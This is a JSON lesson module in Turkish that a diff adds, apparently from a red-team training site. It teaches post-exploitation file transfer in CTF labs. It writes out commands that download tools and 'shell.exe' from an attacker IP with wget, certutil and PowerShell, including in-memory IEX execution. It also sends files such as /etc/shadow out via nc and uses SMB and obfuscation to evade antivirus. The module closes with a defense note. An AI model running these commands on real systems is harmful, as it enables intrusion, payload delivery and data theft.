@@ -1,0 +1,123 @@
+{
+  "id": "file-transfer",
+  "slug": "file-transfer",
+  "title": "Dosya Transferi",
+  "subtitle": "Hedefe / Hedeften Dosya Aktarma",
+  "description": "Ele geçirilen sisteme araç (LinPEAS, exploit) gönderme ve sistemden veri (flag, hash, config) çekme teknikleri — Linux ve Windows için tüm pratik yöntemler.",
+  "team": "red-team",
+  "category": "Shell & Erişim",
+  "phase": "Post-Exploitation",
+  "icon": "📦",
+  "color": "#ef4444",
+  "tags": ["file transfer", "wget", "curl", "scp", "http.server", "certutil", "smb", "base64"],
+  "modules": [
+    {
+      "id": "linux-transfer",
+      "title": "Linux'ta Dosya Transferi",
+      "description": "HTTP sunucu, wget/curl, scp ve nc ile transfer",
+      "difficulty": "beginner",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Transfer Mantığı",
+          "content": "Bir shell aldıktan sonra sürekli dosya taşırsın: **araçları hedefe** (LinPEAS, exploit, statik binary) ve **veriyi hedeften** (flag, /etc/shadow, config, hash) kendine.\n\n**Temel kurulum:** Saldırgan makinede bir HTTP sunucu aç, hedeften indir.\n```\nSaldırgan:  python3 -m http.server 80\nHedef:      wget http://SALDIRGAN/linpeas.sh\n```\n\n**Yöntem seçimi:**\n- wget/curl varsa → en kolay\n- yoksa → nc, /dev/tcp, base64, scp (SSH varsa)\n- Windows → certutil, PowerShell, SMB\n\n**CTF ipucu:** Saldırgan makinende araçları tek klasörde tut (/opt/tools) ve oradan http.server ile servis et."
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Linux Transfer Komutları",
+          "commands": [
+            {
+              "command": "python3 -m http.server 80",
+              "description": "Saldırgan makinede HTTP sunucu aç (bulunduğun klasörü servis eder)",
+              "tip": "Hedef bu sunucudan wget/curl ile indirir. 80 portu firewall'dan geçer.",
+              "flags": [
+                { "flag": "80", "description": "Dinlenecek port" }
+              ]
+            },
+            {
+              "command": "wget http://10.10.14.1/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh",
+              "description": "Hedefte: aracı indir ve çalıştırılabilir yap",
+              "tip": "/tmp genelde yazılabilirdir. curl alternatifi: curl http://10.10.14.1/linpeas.sh -o /tmp/linpeas.sh"
+            },
+            {
+              "command": "scp dosya.txt kullanici@10.10.10.1:/tmp/",
+              "description": "SSH üzerinden güvenli dosya kopyalama (kimlik bilgisi varsa)",
+              "tip": "Hedeften almak için: scp kullanici@10.10.10.1:/etc/passwd ."
+            },
+            {
+              "command": "# Hedeften veri çekme (nc):\n# Saldırgan: nc -lvnp 4444 > alinan.txt\n# Hedef:     nc 10.10.14.1 4444 < gizli.txt",
+              "description": "Netcat ile dosya çekme (wget/curl yoksa)",
+              "tip": "Küçük dosyalar için base64 de pratik: hedefte base64 dosya, çıktıyı kopyala, yerelde base64 -d."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "windows-transfer",
+      "title": "Windows'ta Dosya Transferi",
+      "description": "certutil, PowerShell ve SMB ile transfer",
+      "difficulty": "intermediate",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Windows Transfer Komutları",
+          "commands": [
+            {
+              "command": "certutil -urlcache -split -f http://10.10.14.1/nc.exe C:\\Windows\\Temp\\nc.exe",
+              "description": "certutil ile HTTP üzerinden indir (her Windows'ta var)",
+              "tip": "certutil bir sertifika aracıdır ama dosya indirmek için kötüye kullanılır (LOLBAS).",
+              "flags": [
+                { "flag": "-urlcache -split -f", "description": "URL'den indir, önbelleğe alma" }
+              ]
+            },
+            {
+              "command": "powershell -c \"Invoke-WebRequest -Uri http://10.10.14.1/winpeas.exe -OutFile C:\\Windows\\Temp\\winpeas.exe\"",
+              "description": "PowerShell ile indir (IWR)",
+              "tip": "Kısa hali: iwr http://.../file -o file. Eski sistemlerde: (New-Object Net.WebClient).DownloadFile(...)"
+            },
+            {
+              "command": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://10.10.14.1/shell.exe','C:\\Temp\\shell.exe')\"",
+              "description": "WebClient ile indir (eski PowerShell'lerde çalışır)",
+              "tip": "Bellekten çalıştırma (diske yazmadan): IEX(New-Object Net.WebClient).DownloadString('http://.../script.ps1')"
+            },
+            {
+              "command": "# Saldırgan (SMB sunucu):\nimpacket-smbserver share $(pwd) -smb2support\n# Hedef:\ncopy \\\\10.10.14.1\\share\\nc.exe .",
+              "description": "Impacket SMB sunucusu ile transfer (AV'yi atlatmada da kullanışlı)",
+              "tip": "SMB transfer bazen HTTP'den daha az gürültülüdür. -smb2support modern Windows için gerekli."
+            }
+          ]
+        },
+        {
+          "id": "lab",
+          "type": "lab",
+          "title": "CTF Senaryosu: Aracı Gönder, Flag'i Al",
+          "scenario": {
+            "title": "İki Yönlü Transfer Pratiği",
+            "objective": "Ele geçirilen bir sisteme privesc aracı (LinPEAS/WinPEAS) gönder, çalıştır ve çıktıyı/flag'i kendi makinene çek.",
+            "environment": "TryHackMe/HTB makinesi (foothold sonrası)",
+            "difficulty": "beginner",
+            "steps": [
+              "Saldırgan: araçların olduğu klasörde python3 -m http.server 80",
+              "Hedef (Linux): wget http://SENIN_IP/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh",
+              "Hedef (Windows): certutil -urlcache -split -f http://SENIN_IP/winpeas.exe C:\\Temp\\wp.exe",
+              "Aracı çalıştır, çıktıyı dosyaya yaz",
+              "Çıktıyı çek: nc veya scp ile kendi makinene al, incele"
+            ],
+            "hints": [
+              "Yazılabilir dizin: Linux /tmp, Windows C:\\Windows\\Temp",
+              "wget/curl yoksa Linux'ta /dev/tcp veya base64 kullan",
+              "AV winpeas.exe'yi silerse SMB transfer veya obfuscation dene"
+            ],
+            "defenseNote": "Savunma: Giden trafiği kısıtla, LOLBAS araçlarını (certutil, bitsadmin) izle, AppLocker ile bilinmeyen exe'leri engelle, EDR ile anormal indirme/çalıştırmayı tespit et ve %TEMP% dizinlerini izle."
+          }
+        }
+      ]
+    }
+  ]
+}
